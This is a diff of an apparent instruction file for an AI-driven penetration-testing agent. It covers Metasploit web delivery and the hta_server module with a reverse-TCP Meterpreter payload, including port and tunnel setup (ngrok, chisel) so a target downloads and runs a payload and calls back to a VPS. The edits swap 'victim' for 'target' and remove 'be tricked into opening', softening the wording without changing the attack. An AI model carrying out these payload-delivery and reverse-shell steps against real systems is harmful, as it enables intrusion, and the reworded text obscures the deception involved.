@@ -168,13 +168,13 @@ kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
 Host a payload on a web server and generate a one-liner for the target to execute.
 
 **⚠ TUNNEL COMPATIBILITY:**
-Web delivery requires TWO open ports reachable by the victim:
+Web delivery requires TWO open ports reachable by the target:
 1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
 2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback
 
 **→ If using ngrok (single tunnel): DO NOT use web_delivery.** ngrok only forwards ONE port (LPORT). Use Method A instead.
 **→ If using chisel tunnel: web delivery WORKS!** Chisel tunnels BOTH SRVPORT (8080) and LPORT (4444).
-   Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`. The victim downloads from `http://<VPS>:8080/...`.
+   Set `SRVHOST 0.0.0.0` and `SRVPORT 8080`. The target downloads from `http://<VPS>:8080/...`.
 **→ If on the same LAN as the target: web delivery works** (both ports directly reachable).
 
 ```
@@ -213,7 +213,7 @@ use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
 **After running:** The module prints a URL like `http://<SRVHOST>:8080/random.hta`.
-The target must visit this URL or be tricked into opening the `.hta` file.
+The target must visit this URL or open the `.hta` file for the payload to execute.
 
 ---
 
